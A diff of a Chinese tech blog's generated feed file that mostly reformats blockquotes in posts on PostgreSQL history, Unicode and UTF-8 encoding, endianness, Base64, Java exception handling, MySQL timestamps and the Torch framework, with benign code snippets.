 <h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">skinparam backgroundColor #EEEBDC</span><br><span class="line">skinparam handwritten true</span><br><span class="line"></span><br><span class="line">skinparam sequence &#123;</span><br><span class="line">	ArrowColor DeepSkyBlue</span><br><span class="line">	ActorBorderColor DeepSkyBlue</span><br><span class="line">	LifeLineBorderColor blue</span><br><span class="line">	LifeLineBackgroundColor #A9DCDF</span><br><span class="line"></span><br><span class="line">	ParticipantBorderColor DeepSkyBlue</span><br><span class="line">	ParticipantBackgroundColor DodgerBlue</span><br><span class="line">	ParticipantFontName Impact</span><br><span class="line">	ParticipantFontSize 17</span><br><span class="line">	ParticipantFontColor #A9DCDF</span><br><span class="line"></span><br><span class="line">	ActorBackgroundColor aqua</span><br><span class="line">	ActorFontColor DeepSkyBlue</span><br><span class="line">	ActorFontSize 17</span><br><span class="line">	ActorFontName Aapex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">actor User</span><br><span class="line">participant &quot;First Class&quot; as A</span><br><span class="line">participant &quot;Second Class&quot; as B</span><br><span class="line">participant &quot;Last Class&quot; as C</span><br><span class="line"></span><br><span class="line">User -&gt; A: DoWork</span><br><span class="line">activate A</span><br><span class="line"></span><br><span class="line">A -&gt; B: Create Request</span><br><span class="line">activate B</span><br><span class="line"></span><br><span class="line">B -&gt; C: DoWork</span><br><span class="line">activate C</span><br><span class="line">C --&gt; B: WorkDone</span><br><span class="line">destroy C</span><br><span class="line"></span><br><span class="line">B --&gt; A: Request Created</span><br><span class="line">deactivate B</span><br><span class="line"></span><br><span class="line">A --&gt; User: Done</span><br><span class="line">deactivate A</span><br><span class="line"></span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
@@ -3900,13 +4120,19 @@ or (using formats recognized by popular editors)
       <content type="html"><![CDATA[<p><img src="https://www.postgresql.org/media/img/layout/hdr_left.png" alt=""></p>
 <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
 <p>PostgreSQL是自由的对象-关系型数据库服务器（数据库管理系统）</p>
+</blockquote>
+<blockquote>
 <p><a href="https://zh.wikipedia.org/wiki/PostgreSQL" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/PostgreSQL</a></p>
 </blockquote>
 <p>发展流程:</p>
 <img src="/2016/09/27/postgre/history.jpg">
 <blockquote>
 <p>PostgreSQL 的前身是 BSD 的始于 1977 年的 Ingres 项目，82年，项目领导人Michael Stonebraker 将其商业化。85年正式更名为Postgres。</p>
+</blockquote>
+<blockquote>
 <p>92年两名伯克利的研究生在做研究生课题的时候，用SQL92替换了原有的Postquel作为查询语言，并将其更名为Postgres95。</p>
+</blockquote>
+<blockquote>
 <p>96年，一群黑客们接手了Postgres95，开始修改及稳定它的代码，并与同年8月发布了第一个开源版本，将其更名为PostgreSQL。</p>
 </blockquote>
 <p>PG支持的数据类型非常丰富，他支持任意精度的数值类型，无限长度的文本类型，同时具有一些nosql的特性，也可以存储hash表（hstore），ltree树状结构，支持jsonb、xml、array的存储和操作。同时PG提供了对IP地址和地理信息的良好支持。</p>
@@ -4034,13 +4260,21 @@ or (using formats recognized by popular editors)
 <h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><img src="/2016/09/26/character-encoding/Unicode_logo.jpg">
 <blockquote>
 <p>Unicode provides a unique number for every character,</p>
+</blockquote>
+<blockquote>
 <p>no matter what the platform,</p>
+</blockquote>
+<blockquote>
 <p>no matter what the program,</p>
+</blockquote>
+<blockquote>
 <p>no matter what the language.</p>
 </blockquote>
 <p>定义：</p>
 <blockquote>
 <p>Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。</p>
+</blockquote>
+<blockquote>
 <p>In Unicode, a character is dened as the smallest component of a written language that has semantic value.<br>The number assigned to a character is called a <strong>code point</strong>. A code point is denoted by U+ following by a<br>hexadecimal number from 4 to 8 digits long. Most of the code points in use are 4 digits long. For example,<br><code>U+03C6</code> is the code point for the Greek character f.</p>
 </blockquote>
 <img src="/2016/09/26/character-encoding/unicode-layout.jpg">
@@ -4063,11 +4297,17 @@ or (using formats recognized by popular editors)
 </ol>
 <blockquote>
 <p>它们造成的结果是：</p>
+</blockquote>
+<blockquote>
 <p>1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。</p>
+</blockquote>
+<blockquote>
 <p>2）Unicode在很长一段时间内无法推广，直到互联网的出现。</p>
 </blockquote>
 <h3 id="CJK"><a href="#CJK" class="headerlink" title="CJK"></a>CJK</h3><blockquote>
 <p>Q: What does the term “CJK” mean?</p>
+</blockquote>
+<blockquote>
 <p>A: It is a commonly used acronym for “Chinese, Japanese, and Korean”. The term “CJK character” generally refers to “Chinese characters”, or more specifically, the Chinese (= Han) ideographs used in the writing systems of the Chinese and Japanese languages, occasionally for Korean, and historically in Vietnam.</p>
 </blockquote>
 <h3 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h3><blockquote>
@@ -4081,7 +4321,11 @@ or (using formats recognized by popular editors)
 </blockquote>
 <h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><blockquote>
 <p>UTF-8的编码规则很简单，只有二条：</p>
+</blockquote>
+<blockquote>
 <p>1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。</p>
+</blockquote>
+<blockquote>
 <p>2）对于n字节的符号（n&gt;1），<strong>第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10</strong>。剩下的没有提及的二进制位，全部为这个符号的unicode码。</p>
 </blockquote>
 <p>所以如果第一个字节是<code>0</code>开头的，那么就是兼容ASCII码的单字节字符；如果第一个字节是<code>1</code>开头的就是多字节字符，数一数前面有多少个<code>1</code>，就知道这个字符占了几个字节。</p>
@@ -4154,6 +4398,8 @@ or (using formats recognized by popular editors)
 </blockquote>
 <h4 id="字节序用途"><a href="#字节序用途" class="headerlink" title="字节序用途"></a>字节序用途</h4><blockquote>
 <p>Little-Endian最常用，大部分用户的操作系统（如windows, FreeBsd,Linux）是Little Endian的。</p>
+</blockquote>
+<blockquote>
 <p>Big-Endian最常用在网络协议上，例如TCP/IP协议使用的是big endian. 操作系统上如MAC OS ,是Big Endian 的。<br>本质上说，Little Endian还是Big Endian与操作系统和芯片类型都有关系。PowerPC系列采用big endian方式存储数据，x86系列则采用little endian方式存储数据。</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Big Endian</span><br><span class="line">   低地址                                           高地址</span><br><span class="line">   -----------------------------------------&gt;</span><br><span class="line">   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">   |     12     |      34    |     56      |     78    |</span><br><span class="line">   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">Little Endian</span><br><span class="line">   低地址                                           高地址</span><br><span class="line">   -----------------------------------------&gt;</span><br><span class="line">   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">   |     78     |      56    |     34      |     12    |</span><br></pre></td></tr></table></figure>
@@ -4209,12 +4455,18 @@ or (using formats recognized by popular editors)
 <p>说白了就是将二进制的数据转换成字符编码。Base64由大小写字母各26个，<code>0-9</code>的10个数字，加号<code>+</code><br>以及斜杠<code>/</code>，一共64个字符组成，另外还用<code>=</code>来用作后缀，总共涉及的字符达到65个。</p>
 <blockquote>
 <p>a）所有的二进制文件，都可以因此转化为可打印的文本编码，使用文本软件进行编辑；</p>
+</blockquote>
+<blockquote>
 <p>b）能够对文本进行简单的加密。</p>
+</blockquote>
+<blockquote>
 <p>来自 <a href="http://www.ruanyifeng.com/blog/2008/06/base64.html" rel="external nofollow noopener noreferrer" target="_blank">Base64笔记-阮一峰</a></p>
 </blockquote>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><img src="/2016/09/26/base64/encoding.jpg">
 <blockquote>
 <p>转换的时候，将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲器中剩下的bit用0补足。然后，每次取出6（因为26=64）个bit，按照其值选择ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。</p>
+</blockquote>
+<blockquote>
 <p><a href="https://zh.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/Base64</a></p>
 </blockquote>
 <p>如果要编码的字节数不能被3整除:</p>
@@ -4228,8 +4480,14 @@ or (using formats recognized by popular editors)
 <p>  Base64字符串只可能最后出现一个或两个”=”，中间是不可能出现”=”的</p>
 <h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><blockquote>
 <p>Base64 主要不是加密，它主要的用途是把一些二进制数转成普通字符用于网络传输。由于一些二进制字符在传输协议中属于控制字符，不能直接传送需要转换一下。Base64编码就是把二进制字节序列转化为ASCII字符序列。一般增加1/3长度，而且也是不可读的。</p>
+</blockquote>
+<blockquote>
 <p><a href="http://nieyong.github.io/wiki_web/BASE64%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8.html" rel="external nofollow noopener noreferrer" target="_blank">BASE64编码原理及应用</a></p>
+</blockquote>
+<blockquote>
 <p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email、在XML中存储复杂数据。</p>
+</blockquote>
+<blockquote>
 <p><a href="https://zh.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/Base64</a></p>
 </blockquote>
 <h2 id="python中简单使用"><a href="#python中简单使用" class="headerlink" title="python中简单使用"></a>python中简单使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encoded = base64.b64encode(<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> encoded</span><br><span class="line">aGVsbG8gd29ybGQ=</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = base64.b64decode(encoded)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> data</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
@@ -4291,8 +4549,8 @@ or (using formats recognized by popular editors)
 </ul>
 <blockquote>
 <p>处理业务的时候80%的时候是没问题的，但可能有20%的时候事情没<br>有按理想的方向发展。例如注册用户的时候，正常情况是注册成功，但<br>可能用户提交请求的时候，系统发现用户名已经被别人注册了，这是就<br>可以抛出一个UserAlreadyExistsException</p>
-<p>来自 <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
 </blockquote>
+<p>来自 <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
 <p>业务异常一般是上层可以处理的，一般声明为<code>CheckedException</code>，强制上层进行捕获处理</p>
 <p>业务异常定义示例摘自<a href="http://gaojiewyh.iteye.com/blog/1297746#bc2369985" rel="external nofollow noopener noreferrer" target="_blank">spring mvc 异常统一处理</a>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class BusinessException extends Exception &#123;  </span><br><span class="line">   </span><br><span class="line">    private static final long serialVersionUID = 1L;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException() &#123;  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException(String message) &#123;  </span><br><span class="line">        super(message);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException(Throwable cause) &#123;  </span><br><span class="line">        super(cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException(String message, Throwable cause) &#123;  </span><br><span class="line">        super(message, cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -4302,6 +4560,8 @@ or (using formats recognized by popular editors)
 </ul>
 <blockquote>
 <p>系统异常与具体业务流程没有直接的关系，例如编程错误导致的NullPointExcpetion，<br>还有环境问题，例如磁盘损坏或者网络连接不稳定造成了IOException。</p>
+</blockquote>
+<blockquote>
 <p>来自  <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
 </blockquote>
 <p>系统异常一般是上层无法处理的，所以一般声明为<code>UncheckedException</code>，不强制用户捕获。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class SystemException extends RuntimeException &#123;  </span><br><span class="line">   </span><br><span class="line">    private static final long serialVersionUID = 1L;  </span><br><span class="line">   </span><br><span class="line">    public SystemException() &#123;  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /** </span><br><span class="line">     * @param message </span><br><span class="line">     */  </span><br><span class="line">    public SystemException(String message) &#123;  </span><br><span class="line">        super(message);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /** </span><br><span class="line">     * @param cause </span><br><span class="line">     */  </span><br><span class="line">    public SystemException(Throwable cause) &#123;  </span><br><span class="line">        super(cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /** </span><br><span class="line">     * @param message </span><br><span class="line">     * @param cause </span><br><span class="line">     */  </span><br><span class="line">    public SystemException(String message, Throwable cause) &#123;  </span><br><span class="line">        super(message, cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
@@ -4347,6 +4607,8 @@ or (using formats recognized by popular editors)
       <url>http://qsli.github.io/2016/09/25/mysql-time/</url>
       <content type="html"><![CDATA[<h2 id="自动更新时间戳"><a href="#自动更新时间戳" class="headerlink" title="自动更新时间戳"></a>自动更新时间戳</h2><blockquote>
 <p>TIMESTAMP and DATETIME columns can be automatically initializated and updated to the current date and time (that is, the current timestamp).</p>
+</blockquote>
+<blockquote>
 <p>For any TIMESTAMP or DATETIME column in a table, you can assign the current timestamp as the default value, the auto-update value, or both:</p>
 </blockquote>
 <p><a href="http://dev.mysql.com/doc/refman/5.7/en/timestamp-initialization.html" rel="external nofollow noopener noreferrer" target="_blank">mysql官方文档说明</a></p>
@@ -4474,7 +4736,11 @@ or (using formats recognized by popular editors)
 <p>项目地址: <a href="https://github.com/torch/torch7" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/torch/torch7</a><br>项目博客: <a href="http://torch.ch/blog/" rel="external nofollow noopener noreferrer" target="_blank">http://torch.ch/blog/</a><br>Slides: <a href="https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf</a><br>语言: Lua<br>项目简介:</p>
 <blockquote>
 <p>Torch并没有跟随Python的潮流，它是基于Lua的。对于解释器没有必要像Matlab或者Python那样，Lua会给你神奇的控制台。Torch被Facebook人工智能研究实验室和位于伦敦的谷歌DeepMind大量使用。</p>
+</blockquote>
+<blockquote>
 <p>Torch is a scientific computing framework with wide support for machine learning algorithms. It is &gt; &gt; easy to use and efficient, thanks to an easy and fast scripting language, LuaJIT, and an underlying &gt; C/CUDA implementation.</p>
+</blockquote>
+<blockquote>
 <p>A summary of core features:</p>
 <ul>
 <li>a powerful N-dimensional array</li>
